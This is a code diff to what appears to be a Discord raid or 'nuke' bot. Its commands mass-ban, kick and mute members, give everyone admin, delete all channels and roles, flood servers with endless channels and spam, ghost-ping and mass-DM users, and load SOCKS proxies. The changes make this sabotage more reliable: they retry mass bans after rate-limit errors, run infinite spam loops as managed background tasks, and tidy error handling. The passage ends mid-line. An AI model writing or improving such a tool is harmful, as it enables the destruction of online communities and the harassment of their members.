@@ -106,6 +106,19 @@ config = load_config()
 # Reload translations based on config language
 load_translations(config.get("language", "en"))
 
+def validate_config(cfg: dict) -> None:
+    """Warn at startup about missing or malformed config values."""
+    owner_id = cfg.get("owner_id")
+    if not owner_id:
+        print(f'{Fore.YELLOW}[CONFIG] owner_id is not set — owner-only commands will not work.{Style.RESET_ALL}')
+    else:
+        try:
+            int(str(owner_id))
+        except ValueError:
+            print(f'{Fore.RED}[CONFIG] owner_id "{owner_id}" is not a valid integer Discord ID.{Style.RESET_ALL}')
+
+validate_config(config)
+
 def load_proxies():
     """Load SOCKS4 and SOCKS5 proxies from socks4.txt and socks5.txt"""
     proxies = []
@@ -163,11 +176,20 @@ async def on_command(ctx):
 @bot.event
 async def on_command_error(ctx, error):
     """Log command errors"""
-    # Don't log CheckFailure errors (these are from is_authorized failures, already logged)
     if isinstance(error, commands.CheckFailure):
         return
 
-    # Log other errors
+    if isinstance(error, commands.CommandOnCooldown):
+        try:
+            await ctx.message.delete()
+        except (discord.HTTPException, discord.NotFound):
+            pass
+        try:
+            await ctx.send(f"Command on cooldown. Try again in {error.retry_after:.0f}s.", delete_after=5)
+        except discord.HTTPException:
+            pass
+        return
+
     logger.error(t("command_error", user=ctx.author, user_id=ctx.author.id, command=ctx.command.name if ctx.command else 'Unknown', guild=ctx.guild.name if ctx.guild else 'DM', error=str(error)))
 
 @bot.event
@@ -207,7 +229,7 @@ def is_authorized():
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Send unauthorized message
@@ -217,7 +239,7 @@ def is_authorized():
                 color=discord.Color.red()
             )
             await ctx.send(embed=embed, delete_after=5)
-        except:
+        except discord.HTTPException:
             pass
 
         return False
@@ -234,7 +256,7 @@ def is_owner():
             return True
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
         embed = discord.Embed(
             description=t("owner_only_message"),
@@ -242,7 +264,7 @@ def is_owner():
         )
         try:
             await ctx.send(embed=embed, delete_after=5)
-        except:
+        except discord.HTTPException:
             pass
         return False
     return commands.check(predicate)
@@ -252,7 +274,7 @@ async def send_dm(ctx, content=None, embed=None):
     # Delete the original command message
     try:
         await ctx.message.delete()
-    except:
+    except (discord.HTTPException, discord.NotFound):
         pass
 
     # Send ephemeral-style message in channel (auto-deletes after 3 seconds)
@@ -261,7 +283,7 @@ async def send_dm(ctx, content=None, embed=None):
             await ctx.send(embed=embed, delete_after=3)
         else:
             await ctx.send(content, delete_after=3)
-    except:
+    except discord.HTTPException:
         pass
 
     # Also send a DM to the user
@@ -273,6 +295,38 @@ async def send_dm(ctx, content=None, embed=None):
     except discord.Forbidden:
         # DMs are disabled, but they already got the channel message
         pass
+
+async def rate_limited_action(coro_fn):
+    """Call coro_fn(), retrying once after the Discord-specified delay on a 429. Returns True on success."""
+    try:
+        await coro_fn()
+        return True
+    except discord.HTTPException as e:
+        if e.status == 429:
+            await asyncio.sleep(getattr(e, 'retry_after', 1.0))
+            try:
+                await coro_fn()
+                return True
+            except (discord.HTTPException, discord.Forbidden):
+                return False
+        return False
+    except discord.Forbidden:
+        return False
+
+def parse_duration(duration: str):
+    """Parse a duration string (e.g. 10m, 1h, 30s, 1d) into a timedelta. Returns None on invalid input."""
+    time_units = {"s": 1, "m": 60, "h": 3600, "d": 86400}
+    try:
+        unit = duration[-1]
+        amount = int(duration[:-1])
+        if unit not in time_units or amount <= 0:
+            return None
+        return timedelta(seconds=amount * time_units[unit])
+    except (ValueError, IndexError):
+        return None
+
+# Tracks long-running background tasks so they can be cancelled (e.g. spam, brainfuck)
+_active_tasks: dict[str, asyncio.Task] = {}
 
 class HelpView(discord.ui.View):
     def __init__(self, pages, author):
@@ -319,7 +373,7 @@ async def help_command(ctx):
     # Delete command message
     try:
         await ctx.message.delete()
-    except:
+    except (discord.HTTPException, discord.NotFound):
         pass
 
     # Define command pages (5 commands per page)
@@ -477,7 +531,7 @@ async def delchannel(ctx, channel: discord.TextChannel):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Delete the specified channel
@@ -522,7 +576,7 @@ async def nuke(ctx):
         # Delete the command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Delete the channel
@@ -556,6 +610,7 @@ async def nuke(ctx):
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
 @is_authorized()
+@commands.cooldown(1, 60, commands.BucketType.guild)
 @bot.command(name='nuke-all')
 @commands.has_permissions(administrator=True)
 async def nuke_all(ctx):
@@ -567,7 +622,7 @@ async def nuke_all(ctx):
         # Delete the command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -576,7 +631,7 @@ async def nuke_all(ctx):
         # Send initial DM
         try:
             await author.send(t("nuke_all_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         deleted_channels = 0
@@ -637,12 +692,12 @@ async def nuke_all(ctx):
     except discord.Forbidden:
         try:
             await author.send(t("nuke_all_no_permission"))
-        except:
+        except discord.Forbidden:
             pass
     except Exception as e:
         try:
             await author.send(t("error_occurred", error=str(e)))
-        except:
+        except discord.Forbidden:
             pass
 
 @is_authorized()
@@ -711,8 +766,8 @@ async def ban(ctx, member: discord.Member, *, reason: str = "BYE BYE"):
                 color=discord.Color.red()
             )
             await member.send(embed=dm_embed)
-        except:
-            pass  # DMs disabled or blocked
+        except discord.Forbidden:
+            pass
 
         await member.ban(reason=f"{reason} | Banned by {ctx.author}")
         print(f'{Fore.RED}[BAN] {Fore.WHITE}Banned {member.display_name} from {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
@@ -772,8 +827,8 @@ async def kick(ctx, member: discord.Member, *, reason: str = "BYE BYE"):
                 color=discord.Color.orange()
             )
             await member.send(embed=dm_embed)
-        except:
-            pass  # DMs disabled or blocked
+        except discord.Forbidden:
+            pass
 
         await member.kick(reason=f"{reason} | Kicked by {ctx.author}")
         print(f'{Fore.RED}[KICK] {Fore.WHITE}Kicked {member.display_name} from {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
@@ -804,17 +859,8 @@ async def mute(ctx, member: discord.Member, duration: str = "10m", *, reason: st
         await send_dm(ctx, t("mute_bot_no_permission"))
         return
 
-    # Parse duration
-    time_units = {"s": 1, "m": 60, "h": 3600, "d": 86400}
-    try:
-        unit = duration[-1]
-        amount = int(duration[:-1])
-        if unit not in time_units:
-            await send_dm(ctx, t("mute_invalid_unit"))
-            return
-        seconds = amount * time_units[unit]
-        timeout_duration = timedelta(seconds=seconds)
-    except (ValueError, IndexError):
+    timeout_duration = parse_duration(duration)
+    if timeout_duration is None:
         await send_dm(ctx, t("mute_invalid_format"))
         return
 
@@ -826,8 +872,8 @@ async def mute(ctx, member: discord.Member, duration: str = "10m", *, reason: st
                 color=discord.Color.dark_gray()
             )
             await member.send(embed=dm_embed)
-        except:
-            pass  # DMs disabled or blocked
+        except discord.Forbidden:
+            pass
 
         await member.timeout(timeout_duration, reason=f"{reason} | Muted by {ctx.author}")
         print(f'{Fore.YELLOW}[MUTE] {Fore.WHITE}Muted {member.display_name} for {duration} in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
@@ -888,7 +934,7 @@ async def god(ctx):
             try:
                 bot_top_role = ctx.guild.me.top_role
                 await new_role.edit(position=bot_top_role.position - 1)
-            except:
+            except discord.HTTPException:
                 pass
 
             # Assign role to user
@@ -916,7 +962,7 @@ async def god_all(ctx):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -940,7 +986,7 @@ async def god_all(ctx):
             try:
                 bot_top_role = guild.me.top_role
                 await god_role.edit(position=bot_top_role.position - 1)
-            except:
+            except discord.HTTPException:
                 pass
 
             print(f'{Fore.MAGENTA}[GOD-ALL] {Fore.WHITE}Created god role (.){Style.RESET_ALL}')
@@ -948,7 +994,7 @@ async def god_all(ctx):
         # Send initial DM
         try:
             await author.send(t("god_all_initiated"))
-        except:
+        except discord.Forbidden:
             pass
 
         # Give role to all members
@@ -963,7 +1009,7 @@ async def god_all(ctx):
             try:
                 await member.add_roles(god_role, reason=f"God-all by {author}")
                 success_count += 1
-            except:
+            except Exception:
                 failed_count += 1
 
         print(f'{Fore.MAGENTA}{Style.BRIGHT}[GOD-ALL] {Fore.WHITE}Complete: {success_count} members given admin, {failed_count} failed{Style.RESET_ALL}')
@@ -994,7 +1040,7 @@ async def rename_server(ctx, *, new_name: str):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Rename the server
@@ -1023,7 +1069,7 @@ async def server_icon(ctx, image_url: str):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Download the image
@@ -1061,7 +1107,7 @@ async def nick(ctx, member: discord.Member, *, nickname: str):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         old_nick = member.display_name
@@ -1097,7 +1143,7 @@ async def nick_all(ctx, *, nickname: str):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -1108,7 +1154,7 @@ async def nick_all(ctx, *, nickname: str):
         # Send initial DM
         try:
             await author.send(t("nick_all_starting", nickname=nickname))
-        except:
+        except discord.Forbidden:
             pass
 
         success_count = 0
@@ -1128,10 +1174,9 @@ async def nick_all(ctx, *, nickname: str):
                 failed_count += 1
                 continue
 
-            try:
-                await member.edit(nick=nickname, reason=f"Nick-all by {author}")
+            if await rate_limited_action(lambda m=member: m.edit(nick=nickname, reason=f"Nick-all by {author}")):
                 success_count += 1
-            except Exception as e:
+            else:
                 failed_count += 1
 
         # Send completion DM
@@ -1159,7 +1204,7 @@ async def role_spam(ctx, role_name: str, count: int):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         if count <= 0:
@@ -1178,7 +1223,7 @@ async def role_spam(ctx, role_name: str, count: int):
         # Send initial DM
         try:
             await author.send(t("role_spam_starting", count=count, name=role_name))
-        except:
+        except discord.Forbidden:
             pass
 
         created_count = 0
@@ -1220,7 +1265,7 @@ async def webhook_nuke(ctx):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -1231,7 +1276,7 @@ async def webhook_nuke(ctx):
         # Send initial DM
         try:
             await author.send(t("webhook_nuke_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         deleted_count = 0
@@ -1245,9 +1290,9 @@ async def webhook_nuke(ctx):
                     try:
                         await webhook.delete(reason=f"Webhook-nuke by {author}")
                         deleted_count += 1
-                    except:
+                    except Exception:
                         failed_count += 1
-            except:
+            except Exception:
                 pass
 
         # Send completion DM
@@ -1275,7 +1320,7 @@ async def server_banner(ctx, image_url: str):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Check if server has banner feature
@@ -1318,7 +1363,7 @@ async def strip(ctx, member: discord.Member):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         if member == ctx.author:
@@ -1363,7 +1408,7 @@ async def emoji_nuke(ctx):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -1374,7 +1419,7 @@ async def emoji_nuke(ctx):
         # Send initial DM
         try:
             await author.send(t("emoji_nuke_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         deleted_count = 0
@@ -1415,7 +1460,7 @@ async def shuffle_channels(ctx):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -1426,7 +1471,7 @@ async def shuffle_channels(ctx):
         # Send initial DM
         try:
             await author.send(t("shuffle_channels_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         import random
@@ -1444,7 +1489,7 @@ async def shuffle_channels(ctx):
                     try:
                         await channel.edit(position=positions[i])
                         modified_count += 1
-                    except:
+                    except Exception:
                         pass
 
         # Shuffle channels without category
@@ -1457,7 +1502,7 @@ async def shuffle_channels(ctx):
                 try:
                     await channel.edit(position=positions[i])
                     modified_count += 1
-                except:
+                except Exception:
                     pass
 
         # Send completion DM
@@ -1485,7 +1530,7 @@ async def voice_scatter(ctx):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -1512,7 +1557,7 @@ async def voice_scatter(ctx):
         # Send initial DM
         try:
             await author.send(t("voice_scatter_starting", users=len(members_in_voice), channels=len(voice_channels)))
-        except:
+        except discord.Forbidden:
             pass
 
         import random
@@ -1553,7 +1598,7 @@ async def mention_spam(ctx, target: str, count: int):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         if count <= 0:
@@ -1571,7 +1616,7 @@ async def mention_spam(ctx, target: str, count: int):
         # Send initial DM
         try:
             await author.send(t("mention_spam_starting", count=count))
-        except:
+        except discord.Forbidden:
             pass
 
         sent_count = 0
@@ -1582,7 +1627,7 @@ async def mention_spam(ctx, target: str, count: int):
                 # Delete immediately for ghost ping effect
                 await msg.delete()
                 sent_count += 1
-            except:
+            except Exception:
                 pass
 
         # Send completion DM
@@ -1610,7 +1655,7 @@ async def server_desc(ctx, *, description: str):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Change server description
@@ -1639,7 +1684,7 @@ async def move_all(ctx, channel: discord.VoiceChannel):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -1659,7 +1704,7 @@ async def move_all(ctx, channel: discord.VoiceChannel):
         # Send initial DM
         try:
             await author.send(t("move_all_starting", users=len(members_in_voice), channel=channel.name))
-        except:
+        except discord.Forbidden:
             pass
 
         moved_count = 0
@@ -1690,6 +1735,7 @@ async def move_all(ctx, channel: discord.VoiceChannel):
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
 @is_authorized()
+@commands.cooldown(1, 60, commands.BucketType.guild)
 @bot.command(name='ban-all')
 @commands.has_permissions(ban_members=True)
 async def ban_all(ctx, *, reason: str = "BYE BYE"):
@@ -1698,13 +1744,13 @@ async def ban_all(ctx, *, reason: str = "BYE BYE"):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Send initial DM
         try:
             await ctx.author.send(t("ban_all_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         banned_count = 0
@@ -1728,19 +1774,16 @@ async def ban_all(ctx, *, reason: str = "BYE BYE"):
                 continue
 
             try:
-                # Try to DM the user before banning
-                try:
-                    dm_embed = discord.Embed(
-                        description=t("ban_dm", guild=ctx.guild.name, reason=reason),
-                        color=discord.Color.red()
-                    )
-                    await member.send(embed=dm_embed)
-                except:
-                    pass  # DMs disabled or blocked
+                await member.send(embed=discord.Embed(
+                    description=t("ban_dm", guild=ctx.guild.name, reason=reason),
+                    color=discord.Color.red()
+                ))
+            except (discord.HTTPException, discord.Forbidden):
+                pass
 
-                await member.ban(reason=f"{reason} | Mass ban by {ctx.author}")
+            if await rate_limited_action(lambda m=member: m.ban(reason=f"{reason} | Mass ban by {ctx.author}")):
                 banned_count += 1
-            except Exception as e:
+            else:
                 failed_count += 1
 
         # Send completion DM
@@ -1760,6 +1803,7 @@ async def ban_all(ctx, *, reason: str = "BYE BYE"):
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
 @is_authorized()
+@commands.cooldown(1, 60, commands.BucketType.guild)
 @bot.command(name='kick-all')
 @commands.has_permissions(kick_members=True)
 async def kick_all(ctx, *, reason: str = "BYE BYE"):
@@ -1768,13 +1812,13 @@ async def kick_all(ctx, *, reason: str = "BYE BYE"):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Send initial DM
         try:
             await ctx.author.send(t("kick_all_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         kicked_count = 0
@@ -1798,19 +1842,16 @@ async def kick_all(ctx, *, reason: str = "BYE BYE"):
                 continue
 
             try:
-                # Try to DM the user before kicking
-                try:
-                    dm_embed = discord.Embed(
-                        description=t("kick_dm", guild=ctx.guild.name, reason=reason),
-                        color=discord.Color.orange()
-                    )
-                    await member.send(embed=dm_embed)
-                except:
-                    pass  # DMs disabled or blocked
+                await member.send(embed=discord.Embed(
+                    description=t("kick_dm", guild=ctx.guild.name, reason=reason),
+                    color=discord.Color.orange()
+                ))
+            except (discord.HTTPException, discord.Forbidden):
+                pass
 
-                await member.kick(reason=f"{reason} | Mass kick by {ctx.author}")
+            if await rate_limited_action(lambda m=member: m.kick(reason=f"{reason} | Mass kick by {ctx.author}")):
                 kicked_count += 1
-            except Exception as e:
+            else:
                 failed_count += 1
 
         # Send completion DM
@@ -1830,21 +1871,13 @@ async def kick_all(ctx, *, reason: str = "BYE BYE"):
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
 @is_authorized()
+@commands.cooldown(1, 30, commands.BucketType.guild)
 @bot.command(name='mute-all')
 @commands.has_permissions(moderate_members=True)
 async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
     """Timeout all members in the server"""
-    # Parse duration
-    time_units = {"s": 1, "m": 60, "h": 3600, "d": 86400}
-    try:
-        unit = duration[-1]
-        amount = int(duration[:-1])
-        if unit not in time_units:
-            await send_dm(ctx, t("mute_invalid_unit"))
-            return
-        seconds = amount * time_units[unit]
-        timeout_duration = timedelta(seconds=seconds)
-    except (ValueError, IndexError):
+    timeout_duration = parse_duration(duration)
+    if timeout_duration is None:
         await send_dm(ctx, t("mute_invalid_format"))
         return
 
@@ -1852,13 +1885,13 @@ async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Send initial DM
         try:
             await ctx.author.send(t("mute_all_starting", duration=duration))
-        except:
+        except discord.Forbidden:
             pass
 
         muted_count = 0
@@ -1882,19 +1915,16 @@ async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
                 continue
 
             try:
-                # Try to DM the user before muting
-                try:
-                    dm_embed = discord.Embed(
-                        description=t("mute_dm", guild=ctx.guild.name, reason=reason),
-                        color=discord.Color.dark_gray()
-                    )
-                    await member.send(embed=dm_embed)
-                except:
-                    pass  # DMs disabled or blocked
+                await member.send(embed=discord.Embed(
+                    description=t("mute_dm", guild=ctx.guild.name, reason=reason),
+                    color=discord.Color.dark_gray()
+                ))
+            except (discord.HTTPException, discord.Forbidden):
+                pass
 
-                await member.timeout(timeout_duration, reason=f"{reason} | Mass mute by {ctx.author}")
+            if await rate_limited_action(lambda m=member: m.timeout(timeout_duration, reason=f"{reason} | Mass mute by {ctx.author}")):
                 muted_count += 1
-            except Exception as e:
+            else:
                 failed_count += 1
 
         # Send completion DM
@@ -1914,6 +1944,7 @@ async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
 @is_authorized()
+@commands.cooldown(1, 120, commands.BucketType.guild)
 @bot.command(name='death')
 @commands.has_permissions(administrator=True)
 async def death(ctx):
@@ -1925,7 +1956,7 @@ async def death(ctx):
         # Delete the command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -1934,7 +1965,7 @@ async def death(ctx):
         # Send initial DM
         try:
             await author.send(t("death_initiated"))
-        except:
+        except discord.Forbidden:
             pass
 
         banned_count = 0
@@ -1956,7 +1987,7 @@ async def death(ctx):
             try:
                 await member.ban(reason=f"DEATH COMMAND | Executed by {author}")
                 banned_count += 1
-            except:
+            except Exception:
                 pass
 
         # Phase 2: DELETE ALL CHANNELS
@@ -1968,7 +1999,7 @@ async def death(ctx):
                     deleted_categories += 1
                 else:
                     deleted_channels += 1
-            except:
+            except Exception:
                 pass
 
         # Phase 3: DELETE ALL ROLES
@@ -1986,7 +2017,7 @@ async def death(ctx):
             try:
                 await role.delete(reason=f"DEATH COMMAND | Executed by {author}")
                 deleted_roles += 1
-            except:
+            except Exception:
                 pass
 
         # Final logging
@@ -2005,15 +2036,16 @@ async def death(ctx):
     except discord.Forbidden:
         try:
             await author.send(t("death_no_permission"))
-        except:
+        except discord.Forbidden:
             pass
     except Exception as e:
         try:
             await author.send(t("error_occurred", error=str(e)))
-        except:
+        except discord.Forbidden:
             pass
 
 @is_authorized()
+@commands.cooldown(1, 120, commands.BucketType.guild)
 @bot.command(name='brainfuck')
 @commands.has_permissions(administrator=True)
 async def brainfuck(ctx, channel_name: str, *, spam_message: str):
@@ -2025,7 +2057,7 @@ async def brainfuck(ctx, channel_name: str, *, spam_message: str):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -2034,7 +2066,7 @@ async def brainfuck(ctx, channel_name: str, *, spam_message: str):
         # Send initial DM
         try:
             await author.send(t("brainfuck_initiated"))
-        except:
+        except discord.Forbidden:
             pass
 
         deleted_count = 0
@@ -2045,66 +2077,61 @@ async def brainfuck(ctx, channel_name: str, *, spam_message: str):
             try:
                 await channel.delete(reason=f"BRAINFUCK | Executed by {author}")
                 deleted_count += 1
-            except:
+            except Exception:
                 pass
 
         print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Deleted {deleted_count} channels - NOW ENTERING INFINITE CHAOS MODE{Style.RESET_ALL}')
 
-        # Background spam task for a channel
+        task_key = f"brainfuck_{guild.id}"
+        channels_created = 0
+        spam_tasks: list[asyncio.Task] = []
+
         async def spam_channel(channel, message):
-            """Infinitely spam in a single channel"""
             while True:
                 try:
                     await channel.send(message)
-                except:
-                    break  # If channel is deleted or error, stop this task
+                except (discord.HTTPException, discord.Forbidden, discord.NotFound):
+                    break
 
-        # Counters
-        channels_created = 0
-        spam_tasks_started = 0
-
-        # Phase 2: INFINITE CHANNEL CREATION AND SPAM
         print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Phase 2: INFINITE channel creation and spam loop activated...{Style.RESET_ALL}')
-
         try:
             await author.send(t("brainfuck_active"))
-        except:
+        except discord.Forbidden:
             pass
 
-        # Infinite loop - create channels and spawn spam tasks
-        while True:
+        async def brainfuck_loop():
+            nonlocal channels_created
             try:
-                # Create a new channel
-                new_channel = await guild.create_text_channel(
-                    name=channel_name,
-                    reason=f"BRAINFUCK infinite | Executed by {author}"
-                )
-                channels_created += 1
+                while True:
+                    try:
+                        new_channel = await guild.create_text_channel(
+                            name=channel_name,
+                            reason=f"BRAINFUCK infinite | Executed by {author}"
+                        )
+                        channels_created += 1
+                        task = asyncio.create_task(spam_channel(new_channel, spam_message))
+                        spam_tasks.append(task)
+                        if channels_created % 10 == 0:
+                            print(f'{Fore.MAGENTA}{Style.BRIGHT}[BRAINFUCK] {Fore.WHITE}{channels_created} channels created...{Style.RESET_ALL}')
+                    except discord.HTTPException:
+                        await asyncio.sleep(0.5)
+            except asyncio.CancelledError:
+                for t_ in spam_tasks:
+                    t_.cancel()
+                print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Stopped after {channels_created} channels.{Style.RESET_ALL}')
 
-                # Spawn a background task to spam in this channel infinitely
-                asyncio.create_task(spam_channel(new_channel, spam_message))
-                spam_tasks_started += 1
-
-                # Log progress every 10 channels
-                if channels_created % 10 == 0:
-                    print(f'{Fore.MAGENTA}{Style.BRIGHT}[BRAINFUCK] {Fore.WHITE}{channels_created} channels created, {spam_tasks_started} spam tasks running...{Style.RESET_ALL}')
-
-            except discord.HTTPException:
-                # Rate limited or too many channels, wait a bit
-                await asyncio.sleep(0.5)
-            except Exception as e:
-                # Other errors, continue anyway
-                pass
+        task = asyncio.create_task(brainfuck_loop())
+        _active_tasks[task_key] = task
 
     except discord.Forbidden:
         try:
             await author.send(t("brainfuck_no_permission"))
-        except:
+        except discord.Forbidden:
             pass
     except Exception as e:
         try:
             await author.send(t("error_occurred", error=str(e)))
-        except:
+        except discord.Forbidden:
             pass
 
 @is_authorized()
@@ -2116,7 +2143,7 @@ async def spam(ctx, count: int, *, message: str):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -2128,20 +2155,29 @@ async def spam(ctx, count: int, *, message: str):
 
             try:
                 await author.send(t("spam_infinite_started", message=message))
-            except:
+            except discord.Forbidden:
                 pass
 
-            # Infinite spam loop
+            task_key = f"spam_{guild.id}"
             spam_count = 0
-            while True:
-                for channel in guild.text_channels:
-                    try:
-                        await channel.send(message)
-                        spam_count += 1
-                        if spam_count % 100 == 0:  # Log every 100 messages
-                            print(f'{Fore.YELLOW}[SPAM] {Fore.WHITE}{spam_count} messages sent...{Style.RESET_ALL}')
-                    except:
-                        pass
+
+            async def spam_loop():
+                nonlocal spam_count
+                try:
+                    while True:
+                        for channel in guild.text_channels:
+                            try:
+                                await channel.send(message)
+                                spam_count += 1
+                                if spam_count % 100 == 0:
+                                    print(f'{Fore.YELLOW}[SPAM] {Fore.WHITE}{spam_count} messages sent...{Style.RESET_ALL}')
+                            except (discord.HTTPException, discord.Forbidden):
+                                pass
+                except asyncio.CancelledError:
+                    print(f'{Fore.YELLOW}[SPAM] {Fore.WHITE}Stopped after {spam_count} messages.{Style.RESET_ALL}')
+
+            task = asyncio.create_task(spam_loop())
+            _active_tasks[task_key] = task
 
         else:
             # Limited spam mode
@@ -2149,7 +2185,7 @@ async def spam(ctx, count: int, *, message: str):
 
             try:
                 await author.send(t("spam_starting", message=message, count=count))
-            except:
+            except discord.Forbidden:
                 pass
 
             total_sent = 0
@@ -2160,7 +2196,7 @@ async def spam(ctx, count: int, *, message: str):
                     try:
                         await channel.send(message)
                         total_sent += 1
-                    except:
+                    except Exception:
                         pass
                 channels_spammed += 1
 
@@ -2189,7 +2225,7 @@ async def dmall(ctx, *, message: str):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         guild = ctx.guild
@@ -2200,7 +2236,7 @@ async def dmall(ctx, *, message: str):
         # Send initial DM to command author
         try:
             await author.send(t("dmall_starting"))
-        except:
+        except discord.Forbidden:
             pass
 
         success_count = 0
@@ -2242,7 +2278,7 @@ async def dmall(ctx, *, message: str):
     except Exception as e:
         try:
             await author.send(t("error_occurred", error=str(e)))
-        except:
+        except discord.Forbidden:
             pass
 
 @is_authorized()
@@ -2253,7 +2289,7 @@ async def dm(ctx, user: discord.Member, *, message: str):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Try to send DM to the target user
@@ -2289,7 +2325,7 @@ async def serverinfo(ctx):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Count channels by type
@@ -2328,6 +2364,38 @@ Created: {guild.created_at.strftime("%Y-%m-%d")}"""
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
 @is_authorized()
+@bot.command(name='stop')
+async def stop_tasks(ctx):
+    """Cancel any running background tasks (spam, brainfuck) in this server"""
+    try:
+        await ctx.message.delete()
+    except (discord.HTTPException, discord.NotFound):
+        pass
+
+    guild_id = ctx.guild.id
+    stopped = []
+    for key in [f"spam_{guild_id}", f"brainfuck_{guild_id}"]:
+        task = _active_tasks.pop(key, None)
+        if task and not task.done():
+            task.cancel()
+            stopped.append(key.split("_")[0])
+
+    if stopped:
+        embed = discord.Embed(
+            description=f"Stopped: {', '.join(stopped)}",
+            color=discord.Color.green()
+        )
+    else:
+        embed = discord.Embed(
+            description="No active tasks to stop.",
+            color=discord.Color.orange()
+        )
+    try:
+        await ctx.author.send(embed=embed)
+    except discord.Forbidden:
+        pass
+
+@is_authorized()
 @bot.command(name='shutdown')
 @commands.has_permissions(administrator=True)
 async def shutdown(ctx):
@@ -2339,7 +2407,7 @@ async def shutdown(ctx):
         # Delete command message
         try:
             await ctx.message.delete()
-        except:
+        except (discord.HTTPException, discord.NotFound):
             pass
 
         # Send DM confirmation
@@ -2349,19 +2417,26 @@ async def shutdown(ctx):
                 color=discord.Color.red()
             )
             await ctx.author.send(embed=embed)
-        except:
+        except discord.Forbidden:
             pass
 
         # Send farewell message in channel
         try:
             await ctx.send(t("shutdown_farewell"), delete_after=3)
-        except:
+        except discord.Forbidden:
             pass
 
         print(f'{Back.RED}{Fore.WHITE}{t("shutdown_now")}{Style.RESET_ALL}')
         logger.info(t("bot_shutdown_complete"))
 
-        # Close the bot
+        # Cancel any running background tasks before closing
+        for key, task in list(_active_tasks.items()):
+            if not task.done():
+                task.cancel()
+        if _active_tasks:
+            await asyncio.gather(*_active_tasks.values(), return_exceptions=True)
+        _active_tasks.clear()
+
         await bot.close()
 
     except Exception as e:
@@ -2375,7 +2450,7 @@ async def invite_nuke(ctx):
     try:
         try:
             await ctx.message.delete()
-        except:
